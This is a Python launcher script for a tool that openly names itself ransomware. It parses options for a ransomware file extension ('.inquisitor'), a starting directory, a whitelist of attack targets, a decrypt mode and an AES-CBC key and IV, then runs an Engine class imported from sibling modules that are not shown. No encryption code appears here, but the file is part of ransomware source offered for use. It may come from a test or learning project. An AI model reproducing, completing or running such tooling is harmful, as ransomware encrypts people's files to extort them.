import sys
import os
import argparse
from logging import error
from pathlib import Path, PurePosixPath

def load_modules():
    try:
        work_dir = PurePosixPath(Path(__file__).parent.resolve())
        modules = [directory for directory in os.listdir(work_dir) if os.path.isdir(PurePosixPath(work_dir, directory))]
        for module in modules:
            if module != "test_env":
                sys.path.append(PurePosixPath(work_dir, module).as_posix())
        return True
    except Exception as exc:
        error(f'Error while importing modules, exception: [{exc}]. Exit.', exc_info=True)
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='soon') # TODO description
    parser.add_argument("-l", "--log_level", dest="logLevel",
                        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], 
                        help='Specify the log level (default: DEBUG).',
                        default='DEBUG')
    parser.add_argument("-e", "--ransomware_extension", dest="rwExt",
                        help='Specify ransomware extension (default: ".inquisitor").',
                        default='.inquisitor')
    parser.add_argument("-d", "--decrypt", dest="decrypt",
                        action="store_true",
                        help='Specify only decrypt mode for crypto engine (default: False).',
                        default=False)
    parser.add_argument("-s", "--start_path", dest="startPath",
                        help='Specify for starting point (No default).',
                        required=True)
    parser.add_argument("-w", "--whitelist", dest="list",
                        help="""
                                Specify path to file with whitelist for attack specified targets (json required). 
                                Please, don\'t remove 'require'-flag functionality or you will shoot yourself in the foot :)
                                Howerer, if you will remove that - use it with care.""",
                        required=True)
    parser.add_argument("-k", "--key", dest="key", type=os.fsencode,
                        help="""
                                Required with decrypt mode. Without decrypt mode - is optional. Required key with 32 bytes.
                                But you can try another standart values for AES in CBC mode (not tested).
                        """)
    parser.add_argument("-i", "--iv", dest="iv", type=os.fsencode,
                        help="""
                                Required with decrypt mode. Without decrypt mode - is optional. Must be 16 bytes.
                        """)
    args = parser.parse_args()

    if args.decrypt:
        if not args.key and not args.iv:
            error(f"Decrypt mode is enabled. That why Key and IV required! Exit.")
            exit()

    if load_modules():
        from engine import Engine
        from logger import setup_logger

        if setup_logger(args.logLevel):
            eng = Engine(args.startPath, args.list, args.rwExt, args.decrypt, args.key, args.iv)
            eng.run()
        else:
            exit()
    else:
        exit()
